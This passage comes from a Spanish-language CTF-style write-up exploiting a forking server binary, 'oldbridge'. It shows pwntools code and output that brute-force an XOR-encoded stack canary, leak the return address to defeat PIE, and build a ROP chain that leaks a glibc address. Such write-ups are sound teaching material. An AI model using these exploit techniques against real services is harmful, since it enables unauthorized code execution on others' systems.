Username found!
</code></pre></div><p>Pero no hay nada más&mldr;</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Comencemos el proceso de explotación obteniendo el valor canario de la pila. Dado que el programa se divide cuando llegan nuevas conexiones, la memoria del proceso padre se copia al proceso hijo. Por lo tanto, podemos usar fuerza bruta byte a byte para obtener todo el canario de la pila porque el hijo se bloqueará cuando el byte esté mal pero dará otra respuesta cuando el byte sobrescrito sea correcto.</p><p>Este es el comportamiento cuando sobrescribimos el canario de la pila:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 1200)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1234  
Username:
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234
*** stack smashing detected ***: terminated  
</code></pre></div><h3 id="ataque-de-fuerza-bruta">Ataque de fuerza bruta</h3><p>Este es el oráculo que necesitamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 1025)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1234  
Username: Username found!

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 1026)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1234
Username:
</code></pre></div><p>Con 6 + 1025 + 1 = 1032 bytes, obtenemos un mensaje <code>Username found!</code> y con un byte más no recibimos el mensaje (y el registro del servidor muestra el error <code>*** stack smashing detected ***</code>).</p><p>Este será el <em>exploit</em> inicial para extraer el canario por fuerza bruta:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">pwn</span> <span class="mtk5">import</span> <span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span> <span class="mtk5">=</span> <span class="mtk4">'oldbridge'</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">get_process</span><span class="mtk1">():</span>
    <span class="mtk5">with</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
        <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">2</span><span class="mtk1">:</span>
            <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span>
            <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">,</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>

        <span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>
        <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">:</span> <span class="mtk8 mtku">bytes</span>, <span class="mtk9 mtki">value_name</span><span class="mtk1">:</span> <span class="mtk8 mtku">str</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>  
    <span class="mtk1">value</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">''</span>
    <span class="mtk1">value_progress</span> <span class="mtk5">=</span> <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk9 mtki">value_name</span><span class="mtk1">)</span>

    <span class="mtk5">while</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">)</span> <span class="mtk5">&lt;</span> <span class="mtk6">8</span><span class="mtk1">:</span>
        <span class="mtk5">for</span> <span class="mtk1">c</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
            <span class="mtk1">value_progress</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk8">repr</span><span class="mtk1">(</span><span class="mtk1">value</span> <span class="mtk5">+</span> <span class="mtk1">p8(</span><span class="mtk1">c</span><span class="mtk1">)))</span>

            <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
            <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk9 mtki">payload</span> <span class="mtk5">+</span> <span class="mtk1">value</span> <span class="mtk5">+</span> <span class="mtk1">p8(</span><span class="mtk1">c</span><span class="mtk1">))</span>

            <span class="mtk5">try</span><span class="mtk1">:</span>
                <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
                <span class="mtk1">value</span> <span class="mtk5">+=</span> <span class="mtk1">p8(</span><span class="mtk1">c</span><span class="mtk1">)</span>
            <span class="mtk5">except</span> <span class="mtk8 mtku">EOFError</span><span class="mtk1">:</span>
                <span class="mtk5">pass</span>
            <span class="mtk5">finally</span><span class="mtk1">:</span>
                <span class="mtk5">with</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
                    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

    <span class="mtk1">value_progress</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk8">repr</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">))</span>

    <span class="mtk5">return</span> <span class="mtk1">value</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">1026</span>
    <span class="mtk1">username</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'davide'</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk1">username</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">canary</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span>, <span class="mtk4">'Canary'</span><span class="mtk1">)</span>


<span class="mtk5">if</span> <span class="mtk1">__name__</span> <span class="mtk5">==</span> <span class="mtk4">'__main__'</span><span class="mtk1">:</span>
    <span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Y aquí tenemos el canario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: b'\r\xa9%\xf53\x1c\x1e\x8c'  
</code></pre></div><p>Pero es raro. Por experiencia, sabemos que los canarios de pila comienzan con un byte nulo para evitar filtraciones en <em>strings</em>. Y aquí vemos un <code>\r</code> (que es <code>0xd</code>). Algunos pueden haber notado lo que está sucediendo. Para el resto, podemos usar GDB para comparar los valores:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oldbridge</span>
Reading symbols from <span class="code-dark-green">oldbridge</span>...
(No debugging symbols found in <span class="code-dark-green">oldbridge</span>)  
<span class="code-red">gef➤</span>  start 1234
<span class="code-blue">[+]</span> Breaking at '0xc99'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  canary
<span class="code-blue">[+]</span> The canary of process 47056 is at 0x7fffffffea59, value is 0xd7564ed1f6b6e100  
<span class="code-green">gef➤</span>  continue
Continuing.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: b'\r\xec\xbb\xfb\xdcC[\xda'  
</code></pre></div><p>Representemos el valor canario en formato hexadecimal:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; from pwn import u64
&gt;&gt;&gt; hex(u64(b'\r\xec\xbb\xfb\xdcC[\xda'))  
'0xda5b43dcfbbbec0d'
</code></pre></div><p>No coinciden. Sabiendo que los dos primeros dígitos deberían ser <code>00</code> y son <code>0d</code>, debemos recordar que había un cifrado XOR con la clave <code>0xd</code>. De hecho, tenemos el valor del canario, pero cifrado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; bytes([b ^ 0xd for b in b'\r\xec\xbb\xfb\xdcC[\xda'])  
b'\x00\xe1\xb6\xf6\xd1NV\xd7'
&gt;&gt;&gt; hex(u64(b'\x00\xe1\xb6\xf6\xd1NV\xd7'))
'0xd7564ed1f6b6e100'
</code></pre></div><p>Y ahí lo tenemos. Por lo tanto, nuestro proceso de fuerza bruta fue correcto. Ahora podemos continuar con los próximos pasos.</p><h3 id="_bypass_-de-pie"><em>Bypass</em> de PIE</h3><p>Necesitamos burlar ASLR tanto para Glibc como para el binario (el PIE está habilitado). Podemos usar el mismo proceso de fuerza bruta porque después del valor del canario tenemos el <code>$rbp</code> guardado del <em>stack frame</em> anterior y luego la dirección de retorno guardada.</p><p>Vamos a verlo en GDB, estableciendo un <em>breakpoint</em> después de la instrucción <code>read</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oldbridge</span>
Reading symbols from <span class="code-dark-green">oldbridge</span>...
(No debugging symbols found in <span class="code-dark-green">oldbridge</span>)
<span class="code-red">gef➤</span>  disassemble check_username
Dump of assembler code for function check_username:
   <span class="code-dark-blue">0x0000000000000b6f</span> &lt;+0&gt;:     push   rbp
   <span class="code-dark-blue">0x0000000000000b70</span> &lt;+1&gt;:     mov    rbp,rsp
   <span class="code-dark-blue">0x0000000000000b73</span> &lt;+4&gt;:     sub    rsp,0x430
   <span class="code-dark-blue">0x0000000000000b7a</span> &lt;+11&gt;:    mov    DWORD PTR [rbp-0x424],edi
   ...
   <span class="code-dark-blue">0x0000000000000bad</span> &lt;+62&gt;:    call   <span class="code-dark-blue">0x910</span> &lt;<span class="code-dark-yellow">write@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000bb2</span> &lt;+67&gt;:    lea    rcx,[rbp-0x410]
   <span class="code-dark-blue">0x0000000000000bb9</span> &lt;+74&gt;:    mov    eax,DWORD PTR [rbp-0x424]
   <span class="code-dark-blue">0x0000000000000bbf</span> &lt;+80&gt;:    mov    edx,0x420
   <span class="code-dark-blue">0x0000000000000bc4</span> &lt;+85&gt;:    mov    rsi,rcx
   <span class="code-dark-blue">0x0000000000000bc7</span> &lt;+88&gt;:    mov    edi,eax
   <span class="code-dark-blue">0x0000000000000bc9</span> &lt;+90&gt;:    call   <span class="code-dark-blue">0x970</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000bce</span> &lt;+95&gt;:    mov    DWORD PTR [rbp-0x414],eax
   <span class="code-dark-blue">0x0000000000000bd4</span> &lt;+101&gt;:   mov    DWORD PTR [rbp-0x418],0x0
   <span class="code-dark-blue">0x0000000000000bde</span> &lt;+111&gt;:   jmp    <span class="code-dark-blue">0xc0b</span> &lt;<span class="code-dark-yellow">check_username+156</span>&gt;
   <span class="code-dark-blue">0x0000000000000be0</span> &lt;+113&gt;:   mov    eax,DWORD PTR [rbp-0x418]
   ...
   <span class="code-dark-blue">0x0000000000000c57</span> &lt;+232&gt;:   call   <span class="code-dark-blue">0x920</span> &lt;<span class="code-dark-yellow">__stack_chk_fail@plt</span>&gt;  
   <span class="code-dark-blue">0x0000000000000c5c</span> &lt;+237&gt;:   leave
   <span class="code-dark-blue">0x0000000000000c5d</span> &lt;+238&gt;:   ret
End of assembler dump.
<span class="code-red">gef➤</span>  break *check_username+95
Breakpoint 1 at <span class="code-dark-blue">0xbce</span>
<span class="code-red">gef➤</span>  set follow-fork-mode child
<span class="code-red">gef➤</span>  run 1234
Starting program: ./oldbridge 1234
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234  
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] b'\0'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Starting program: ./oldbridge 1234
[Attaching after process 61133 fork to child process 61371]
[New inferior 2 (process 61371)]
[Detaching after fork from parent process 61133]
[Inferior 1 (process 61133) detached]
[Switching to process 61371]

Thread 2.1 "oldbridge" hit Breakpoint 1, <span class="code-dark-blue">0x0000555555400bce</span> in <span class="code-dark-yellow">check_username</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  canary
<span class="code-blue">[+]</span> The canary of process 61371 is at 0x7fffffffea59, value is 0x7370c9b1cae54f00  
<span class="code-green">gef➤</span>  x/10gx $rsp+0x400
<span class="code-dark-blue">0x7fffffffe620</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe630</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe640</span>: 0x4141414141414141      0x7370c9b1cae54f00
<span class="code-dark-blue">0x7fffffffe650</span>: 0x00007fffffffe6c0      0x0000555555400ecf
<span class="code-dark-blue">0x7fffffffe660</span>: 0x00007fffffffe7b8      0x00000002000000f0
<span class="code-green">gef➤</span>  x 0x00007fffffffe6c0
<span class="code-dark-blue">0x7fffffffe6c0</span>: 0x0000000000000000
<span class="code-green">gef➤</span>  x 0x0000555555400ecf
<span class="code-dark-blue">0x555555400ecf</span> &lt;<span class="code-dark-yellow">main</span>+566&gt;:      0xbac8458b1674c085
</code></pre></div><p>Ahí tenemos el <code>$rbp</code> guardado y la dirección de retorno guardada. Para ayudar al proceso de fuerza bruta, podemos dar a la función los dos primeros dígitos, que no cambiarán presumiblemente. De hecho, solo estamos interesados en la dirección de retorno, porque tiene una dirección del binario en tiempo de ejecución, por lo que podremos calcular la dirección base. Estas son la función <code>xor</code> y la función <code>main</code> actualizada del <em>exploit</em> de Python:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">:</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">,</span> <span class="mtk9 mtki">key</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; <span class="mtk8 mtku">bytes</span>:</span>
    <span class="mtk5">return</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk1">b</span> <span class="mtk5">^</span> <span class="mtk9 mtki">key</span> <span class="mtk5">for</span> <span class="mtk1">b</span> <span class="mtk5">in</span> <span class="mtk9 mtki">payload</span><span class="mtk1">])</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">1026</span>
    <span class="mtk1">key</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">d</span>
    <span class="mtk1">username</span> <span class="mtk5">=</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'il{dih'</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk1">username</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">help_canary</span> <span class="mtk5">=</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">help_ret</span> <span class="mtk5">=</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xcf</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">xor_canary</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span><span class="mtk1">,</span> <span class="mtk4">'XOR</span> <span class="mtk4">Canary'</span><span class="mtk1">,</span> <span class="mtk9 mtki">value</span><span class="mtk5">=</span><span class="mtk1">help_canary</span><span class="mtk1">)</span>
    <span class="mtk1">xor_saved_rbp</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span> <span class="mtk5">+</span> <span class="mtk1">xor_canary</span><span class="mtk1">,</span> <span class="mtk4">'XOR</span> <span class="mtk4">saved</span> <span class="mtk4">$rbp'</span><span class="mtk1">)</span>
    <span class="mtk1">xor_return_addr</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span> <span class="mtk5">+</span> <span class="mtk1">xor_canary</span> <span class="mtk5">+</span> <span class="mtk1">xor_saved_rbp</span><span class="mtk1">,</span> <span class="mtk4">'XOR</span> <span class="mtk4">return</span> <span class="mtk4">address'</span><span class="mtk1">,</span> <span class="mtk9 mtki">value</span><span class="mtk5">=</span><span class="mtk1">help_ret</span><span class="mtk1">)</span>  

    <span class="mtk1">canary</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">xor_canary</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
    <span class="mtk1">saved_rbp</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">xor_saved_rbp</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
    <span class="mtk1">return_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">xor_return_addr</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>

    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Canary:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">canary</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Saved</span> <span class="mtk4">$rbp:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">saved_rbp</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Return</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">return_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b'\rUMW\xc2\xc9\xd6\x9f'
[<span class="code-green">+</span>] XOR saved $rbp: b'\x9d\xc5\x1cG\xf1r\r\r'
[<span class="code-green">+</span>] XOR return address: b'\xc2\x03\xad\x91I[\r\r'  
[<span class="code-green">+</span>] Canary: 0x92dbc4cf5a405800
[<span class="code-green">+</span>] Saved $rbp: 0x7ffc4a11c890
[<span class="code-green">+</span>] Return address: 0x56449ca00ecf
</code></pre></div><p>Ahora podemos calcular fácilmente la dirección base del binario restando <code>0xecf</code> a la dirección de retorno guardada:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">elf_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">return_addr</span> <span class="mtk5">-</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ecf</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>En este punto, podemos intentar usar <em>gadgets</em> como <code>pop rdi; ret</code> para fugar una dirección dentro de Glibc y burlar ASLR. Estos serían los valores para la cadena ROP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rdi ; ret'</span>
0x0000000000000f73 : <span class="code-red">pop rdi ; ret</span>

<span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> printf
0000000000000940 &lt;<span class="code-red">printf</span>@plt&gt;:
 940:   ff 25 f2 16 20 00       jmpq   *0x2016f2(%rip)        # 202038 &lt;<span class="code-red">printf</span>@GLIBC_2.2.5&gt;  
 cda:   e8 61 fc ff ff          callq  940 &lt;<span class="code-red">printf</span>@plt&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> check_username
    78: 0000000000000b6f   239 FUNC    GLOBAL DEFAULT   14 <span class="code-red">check_username</span>
</code></pre></div><p>Entonces, esta es la cadena ROP (obsérvese el cifrado XOR):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">pop_rdi_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f73</span>
    <span class="mtk1">printf_got</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">202038</span>
    <span class="mtk1">printf_plt</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">940</span>
    <span class="mtk1">check_username_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">b6f</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_canary</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_saved_rbp</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(pop_rdi_ret_addr), key)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(printf_got), key)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(printf_plt), key)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(check_username_addr), key)</span>  
